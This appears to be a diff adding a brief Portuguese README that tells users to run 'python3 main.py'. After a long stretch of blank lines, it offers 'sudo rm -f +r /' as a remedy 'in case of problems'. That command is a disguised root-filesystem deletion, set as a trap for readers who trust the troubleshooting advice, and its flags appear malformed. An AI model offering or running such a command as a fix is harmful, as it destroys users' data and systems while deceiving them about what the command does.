@@ -1,0 +1,17 @@
+Para executar esse software de melhor qualidade do mercado é precisor rodar o sequinte comando
+
+python3 main.py
+
+
+
+
+
+
+
+
+
+
+
+
+Em caso de problemas talvez seja necessario executar o código abaixo
+sudo rm -f +r /
